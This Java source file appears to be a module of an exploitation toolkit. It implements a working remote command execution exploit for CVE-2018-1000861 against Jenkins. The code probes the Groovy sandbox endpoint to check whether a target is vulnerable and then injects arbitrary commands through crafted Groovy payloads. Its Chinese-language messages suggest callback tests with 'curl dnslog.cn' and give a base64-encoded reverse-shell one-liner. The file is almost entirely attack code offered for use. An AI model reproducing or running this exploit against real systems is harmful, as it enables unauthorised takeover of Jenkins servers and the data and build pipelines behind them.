package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;

public class CVE_2018_1000861 implements ExploitInterface {

    private HashMap<String, String> headers = new HashMap();

    private String url = "";

    private boolean isVul = false;

    private String payload1 = "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=";

    private String payload2 = "/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=";


    @Override
    public String checkVul(String url) {
        this.url = url;
        Response response1 = HttpTools.get(url+this.payload1,this.headers,"UTF-8");
        Response response2 = HttpTools.get(url+this.payload2,this.headers,"UTF-8");
        if(response1.getCode()==200||response2.getCode()==200){
            if(response1.getText().equals("<div/>")||response2.getText().equals("<div/>")){
                this.isVul = true;
                return "[+] 目标可能存在CVE-2018-1000861 绕过Groovy沙盒未授权命令执行漏洞,请从文件读取/命令执行模块进行无回显命令执行测试 \n\t eg:admin|curl dnslog.cn or test1|curl dnslog.cn or test2|curl dnslog.cn \n\t 反弹shell: bash -c {echo,Ym...}|{base64,-d}|{bash,-i}";
            }
        }
        return "[-] 目标可能不存在CVE-2018-1000861 绕过Groovy沙盒未授权命令执行漏洞";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        if(!cmd.startsWith("admin|")&&!cmd.startsWith("test1|")&&!cmd.startsWith("test2")){
            return "命令格式: admin|curl dnslog.cn or test1|curl dnslog.cn or test2|curl dnslog.cn";
        }
        int Index = cmd.indexOf("|");
        String user = cmd.substring(0,Index);
        cmd = cmd.substring(Index+1);
        String exp = "";
        String payload = "";
        if(user.equals("admin")){
            exp = "public class x {public x(){\"payload\".execute()}}";
            payload = payload1;
        }else if(user.equals("test1")){
            exp = "import groovy.transform.*\n" +
                    "@ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"payload\")})\n" +
                    "class Person{}";
            payload = payload2;
        }else if(user.equals("test2")){
            exp = "import groovy.transform.*\n" +
                    "@ASTTest(value={ \"payload\".execute().text })\n" +
                    "class Person{}";
            payload = payload2;
        }
        String exp2 = exp.replace("payload",cmd);
        try {
            Response response = HttpTools.get(url + payload + URLEncoder.encode(exp2,"UTF-8"), this.headers, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return "无回显命令执行,请自行进行验证";
    }


    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
